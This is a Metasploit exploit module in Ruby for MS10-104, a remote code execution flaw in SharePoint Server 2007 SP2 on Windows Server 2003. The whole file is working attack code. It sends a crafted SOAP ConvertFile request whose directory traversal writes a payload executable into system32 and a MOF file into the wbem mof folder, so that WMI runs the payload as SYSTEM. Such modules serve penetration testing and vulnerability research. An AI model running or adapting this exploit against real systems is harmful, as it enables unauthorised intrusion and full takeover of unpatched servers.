##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec

  def initialize
    super(
      'Name'        => 'MS10-104 Microsoft Office SharePoint Server 2007 Remote Code Execution',
      'Description'    => %q{
          This module exploits a vulnerability found in SharePoint Server 2007 SP2. The
        software contains a directory traversal, that allows a remote attacker to write
        arbitrary files to the filesystem, sending a specially crafted SOAP ConvertFile
        request to the Office Document Conversions Launcher Service, which results in code
        execution under the context of 'SYSTEM'.

        The module uses the Windows Management Instrumentation service to execute an
        arbitrary payload on vulnerable installations of SharePoint on Windows 2003 Servers.
        It has been successfully tested on Office SharePoint Server 2007 SP2 over Windows
        2003 SP2.
      },
      'Author'      => [
        'Oleksandr Mirosh', # Vulnerability Discovery and PoC
        'James Burton', # Vulnerability analysis published at "Entomology: A Case Study of Rare and Interesting Bugs"
        'juan vazquez' # Metasploit module
      ],
      'Platform'    => 'win',
      'References'  =>
        [
          [ 'CVE', '2010-3964' ],
          [ 'OSVDB', '69817' ],
          [ 'BID', '45264' ],
          [ 'MSB', 'MS10-104' ],
          [ 'ZDI', '10-287' ]
        ],
      'Targets'     =>
        [
          [ 'Microsoft Office SharePoint Server 2007 SP2 / Microsoft Windows Server 2003 SP2', { } ],
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => true,
      'DisclosureDate' => 'Dec 14 2010'
    )

    register_options(
      [
        Opt::RPORT(8082),
        OptInt.new('DEPTH', [true, "Levels to reach base directory",7])
      ])
  end

  # Msf::Exploit::Remote::HttpClient is avoided because send_request_cgi doesn't get
  # the response maybe due to the 100 (Continue) status response even when the Expect
  # header isn't included in the request.
  def upload_file(file_name, contents)

    traversal = "..\\" * datastore['DEPTH']

    soap_convert_file = "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
    soap_convert_file << "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" "
    soap_convert_file << "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" "
    soap_convert_file << "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" "
    soap_convert_file << "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\" "
    soap_convert_file << "SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">" << "\x0d\x0a"
    soap_convert_file << "<SOAP-ENV:Body>" << "\x0d\x0a"
    soap_convert_file << "<i2:ConvertFile id=\"ref-1\" "
    soap_convert_file << "xmlns:i2=\"http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface\">" << "\x0d\x0a"
    soap_convert_file << "<launcherUri id=\"ref-3\">http://#{rhost}:8082/HtmlTrLauncher</launcherUri>" << "\x0d\x0a"
    soap_convert_file << "<appExe id=\"ref-4\"></appExe>" << "\x0d\x0a"
    soap_convert_file << "<convertFrom id=\"ref-5\">#{traversal}#{file_name}</convertFrom>" << "\x0d\x0a"
    soap_convert_file << "<convertTo id=\"ref-6\">html</convertTo>" << "\x0d\x0a"
    soap_convert_file << "<fileBits href=\"#ref-7\"/>" << "\x0d\x0a"
    soap_convert_file << "<taskName id=\"ref-8\">brochure_to_html</taskName>" << "\x0d\x0a"
    soap_convert_file << "<configInfo id=\"ref-9\"></configInfo>" << "\x0d\x0a"
    soap_convert_file << "<timeout>20</timeout>" << "\x0d\x0a"
    soap_convert_file << "<fReturnFileBits>true</fReturnFileBits>" << "\x0d\x0a"
    soap_convert_file << "</i2:ConvertFile>" << "\x0d\x0a"
    soap_convert_file << "<SOAP-ENC:Array id=\"ref-7\" xsi:type=\"SOAP-ENC:base64\">#{Rex::Text.encode_base64(contents)}</SOAP-ENC:Array>" << "\x0d\x0a"
    soap_convert_file << "</SOAP-ENV:Body>" << "\x0d\x0a"
    soap_convert_file << "</SOAP-ENV:Envelope>" << "\x0d\x0a"

    res = send_request_cgi({
      'uri'          => '/HtmlTrLauncher',
      'method'       => 'POST',
      'ctype'        => 'text/xml; charset="utf-8"',
      'headers'      =>
        {
        'SOAPAction'      => '"http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface#ConvertFile"',
        },
      'data' => soap_convert_file
    })
    return res
  end

  # The check tries to create a test file in the root
  def check

    peer = "#{rhost}:#{rport}"
    filename = rand_text_alpha(rand(10)+5) + '.txt'
    contents = rand_text_alpha(rand(10)+5)

    print_status("Sending HTTP ConvertFile Request to upload the test file #{filename}")
    res = upload_file(filename, contents)

    if res and res.code == 200 and res.body =~ /ConvertFileResponse/ and res.body =~ /<m_ce>CE_OTHER<\/m_ce>/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit

    peer = "#{rhost}:#{rport}"

    # Setup the necessary files to do the wbemexec trick
    exe_name = rand_text_alpha(rand(10)+5) + '.exe'
    exe      = generate_payload_exe
    mof_name = rand_text_alpha(rand(10)+5) + '.mof'
    mof      = generate_mof(mof_name, exe_name)

    print_status("Sending HTTP ConvertFile Request to upload the exe payload #{exe_name}")
    res = upload_file("WINDOWS\\system32\\#{exe_name}", exe)
    if res and res.code == 200 and res.body =~ /ConvertFileResponse/ and res.body =~ /<m_ce>CE_OTHER<\/m_ce>/
      print_good("#{exe_name} uploaded successfully")
    else
      print_error("Failed to upload #{exe_name}")
      return
    end

    print_status("Sending HTTP ConvertFile Request to upload the mof file #{mof_name}")
    res = upload_file("WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
    if res and res.code == 200 and res.body =~ /ConvertFileResponse/ and res.body =~ /<m_ce>CE_OTHER<\/m_ce>/
      print_good("#{mof_name} uploaded successfully")
    else
      print_error("Failed to upload #{mof_name}")
      return
    end

  end
end

